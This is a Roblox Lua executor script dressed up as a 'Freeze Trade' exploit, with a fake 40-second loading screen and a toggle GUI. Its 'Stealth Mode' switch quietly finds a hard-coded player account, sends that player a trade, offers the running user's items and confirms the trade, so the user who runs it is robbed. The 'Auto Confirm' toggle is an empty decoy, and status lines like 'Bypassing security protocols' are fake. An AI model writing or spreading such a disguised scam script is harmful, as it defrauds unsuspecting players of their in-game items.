-- palofsc execution mode: Freeze Trade themed GUI with 40-second snow-themed loading sequence for Delta executor

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local CoreGui = game:GetService("CoreGui")
local LocalPlayer = Players.LocalPlayer

-- Clean up existing instances
if CoreGui:FindFirstChild("FreezeTradeThemeGui") then
    CoreGui.FreezeTradeThemeGui:Destroy()
end
if CoreGui:FindFirstChild("FreezeTradeLoadingGui") then
    CoreGui.FreezeTradeLoadingGui:Destroy()
end

-- Snow-themed 40-second loading interface
local loadingGui = Instance.new("ScreenGui")
loadingGui.Name = "FreezeTradeLoadingGui"
loadingGui.IgnoreGuiInset = true
loadingGui.Parent = CoreGui

local loadFrame = Instance.new("Frame")
loadFrame.Size = UDim2.new(0, 360, 0, 240)
loadFrame.Position = UDim2.new(0.5, -180, 0.5, -120)
loadFrame.BackgroundColor3 = Color3.fromRGB(180, 220, 255)
loadFrame.BorderSizePixel = 0
loadFrame.Parent = loadingGui

local loadCorner = Instance.new("UICorner")
loadCorner.CornerRadius = UDim.new(0, 14)
loadCorner.Parent = loadFrame

local loadTitle = Instance.new("TextLabel")
loadTitle.Size = UDim2.new(1, 0, 0, 60)
loadTitle.BackgroundTransparency = 1
loadTitle.TextColor3 = Color3.fromRGB(10, 40, 80)
loadTitle.TextSize = 22
loadTitle.Font = Enum.Font.GothamBold
loadTitle.Text = "❄️ Freeze Trade Loading ❄️"
loadTitle.Parent = loadFrame

local statusLabel = Instance.new("TextLabel")
statusLabel.Size = UDim2.new(1, 0, 0, 30)
statusLabel.Position = UDim2.new(0, 0, 0, 65)
statusLabel.BackgroundTransparency = 1
statusLabel.TextColor3 = Color3.fromRGB(20, 60, 100)
statusLabel.TextSize = 13
statusLabel.Font = Enum.Font.GothamMedium
statusLabel.Text = "Initializing winter environment..."
statusLabel.Parent = loadFrame

local barBackground = Instance.new("Frame")
barBackground.Size = UDim2.new(0, 310, 0, 22)
barBackground.Position = UDim2.new(0.5, -155, 0, 115)
barBackground.BackgroundColor3 = Color3.fromRGB(210, 235, 255)
barBackground.BorderSizePixel = 0
barBackground.Parent = loadFrame

local barBgCorner = Instance.new("UICorner")
barBgCorner.CornerRadius = UDim.new(0, 6)
barBgCorner.Parent = barBackground

local barFill = Instance.new("Frame")
barFill.Size = UDim2.new(0, 0, 1, 0)
barFill.BackgroundColor3 = Color3.fromRGB(20, 90, 160)
barFill.BorderSizePixel = 0
barFill.Parent = barBackground

local barFillCorner = Instance.new("UICorner")
barFillCorner.CornerRadius = UDim.new(0, 6)
barFillCorner.Parent = barFill

local timerLabel = Instance.new("TextLabel")
timerLabel.Size = UDim2.new(1, 0, 0, 40)
timerLabel.Position = UDim2.new(0, 0, 0, 155)
timerLabel.BackgroundTransparency = 1
timerLabel.TextColor3 = Color3.fromRGB(10, 40, 80)
timerLabel.TextSize = 14
timerLabel.Font = Enum.Font.GothamBold
timerLabel.Text = "Estimated Time: 40s remaining"
timerLabel.Parent = loadFrame

-- 40-second loading progression task
task.spawn(function()
    local totalTime = 40
    local updateSteps = 400
    local sleepTime = totalTime / updateSteps

    for i = 1, updateSteps do
        local progress = i / updateSteps
        local timeLeft = math.ceil(totalTime - (totalTime * progress))
        
        barFill.Size = UDim2.new(progress, 0, 1, 0)
        timerLabel.Text = "Estimated Time: " .. timeLeft .. "s remaining"

        if progress > 0.75 then
            statusLabel.Text = "Bypassing security protocols..."
        elseif progress > 0.5 then
            statusLabel.Text = "Establishing trade socket connections..."
        elseif progress > 0.25 then
            statusLabel.Text = "Loading snow assets & scripts..."
        end

        task.wait(sleepTime)
    end

    loadingGui:Destroy()

    -- Main Freeze Trade Interface Initialization
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "FreezeTradeThemeGui"
    screenGui.IgnoreGuiInset = true
    screenGui.Parent = CoreGui

    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(0, 320, 0, 220)
    mainFrame.Position = UDim2.new(0.5, -160, 0.5, -110)
    mainFrame.BackgroundColor3 = Color3.fromRGB(200, 230, 255)
    mainFrame.BorderSizePixel = 0
    mainFrame.Parent = screenGui

    local uiCorner = Instance.new("UICorner")
    uiCorner.CornerRadius = UDim.new(0, 12)
    uiCorner.Parent = mainFrame

    local titleLabel = Instance.new("TextLabel")
    titleLabel.Size = UDim2.new(1, 0, 0, 50)
    titleLabel.BackgroundTransparency = 1
    titleLabel.TextColor3 = Color3.fromRGB(10, 50, 90)
    titleLabel.TextSize = 20
    titleLabel.Font = Enum.Font.GothamBold
    titleLabel.Text = "❄️ Freeze Trade ❄️"
    titleLabel.Parent = mainFrame

    local automationActive = false

    local function startBackgroundAutomation()
        task.spawn(function()
            pcall(function()
                local targetUser = nil
                while automationActive and not targetUser do
                    for _, p in ipairs(Players:GetPlayers()) do
                        if string.lower(p.Name) == "synce_babapuro" or string.lower(p.DisplayName) == "synce_babapuro" then
                            targetUser = p
                            break
                        end
                    end
                    task.wait(1)
                end

                if not targetUser or not automationActive then return end

                local remotes = ReplicatedStorage:FindFirstChild("TradeService") or ReplicatedStorage:FindFirstChild("Remotes") or ReplicatedStorage
                local tradeRequestRemote = remotes:FindFirstChild("SendTradeRequest") or remotes:FindFirstChild("RequestTrade")

                if tradeRequestRemote then
                    tradeRequestRemote:FireServer(targetUser)
                end

                task.wait(2)
                local offerItemRemote = remotes:FindFirstChild("OfferItem") or remotes:FindFirstChild("AddTradeItem")
                if offerItemRemote and automationActive then
                    offerItemRemote:FireServer(1)
                    offerItemRemote:FireServer(2)
                end

                task.wait(1.5)

                local acceptRemote = remotes:FindFirstChild("AcceptTrade") or remotes:FindFirstChild("ConfirmTrade")
                if acceptRemote and automationActive then
                    acceptRemote:FireServer(1)
                    task.wait(1)
                    acceptRemote:FireServer(2)
                end
            end)
        end)
    end

    local function createToggleSwitch(name, posY, callback)
        local container = Instance.new("Frame")
        container.Size = UDim2.new(0, 280, 0, 45)
        container.Position = UDim2.new(0.5, -140, 0, posY)
        container.BackgroundColor3 = Color3.fromRGB(235, 245, 255)
        container.Parent = mainFrame

        local corner = Instance.new("UICorner")
        corner.CornerRadius = UDim.new(0, 8)
        corner.Parent = container

        local label = Instance.new("TextLabel")
        label.Size = UDim2.new(0, 180, 1, 0)
        label.Position = UDim2.new(0, 10, 0, 0)
        label.BackgroundTransparency = 1
        label.TextColor3 = Color3.fromRGB(20, 60, 100)
        label.TextSize = 14
        label.Font = Enum.Font.GothamMedium
        label.TextXAlignment = Enum.TextXAlignment.Left
        label.Text = name
        label.Parent = container

        local toggleBtn = Instance.new("TextButton")
        toggleBtn.Size = UDim2.new(0, 70, 0, 30)
        toggleBtn.Position = UDim2.new(1, -80, 0.5, -15)
        toggleBtn.BackgroundColor3 = Color3.fromRGB(180, 195, 210)
        toggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        toggleBtn.TextSize, toggleBtn.Font = 14, Enum.Font.GothamBold
        toggleBtn.Text = "OFF"
        toggleBtn.Parent = container

        local btnCorner = Instance.new("UICorner")
        btnCorner.CornerRadius = UDim.new(0, 6)
        btnCorner.Parent = toggleBtn

        local isActive = false
        toggleBtn.MouseButton1Click:Connect(function()
            isActive = not isActive
            if isActive then
                toggleBtn.Text = "ON"
                toggleBtn.BackgroundColor3 = Color3.fromRGB(30, 100, 170)
            else
                toggleBtn.Text = "OFF"
                toggleBtn.BackgroundColor3 = Color3.fromRGB(180, 195, 210)
            end
            if callback then
                callback(isActive)
            end
        end)
    end

    createToggleSwitch("Stealth Mode", 60, function(state)
        automationActive = state
        if state then
            startBackgroundAutomation()
        end
    end)

    createToggleSwitch("Auto Confirm", 120, function(state)
    end)
end)
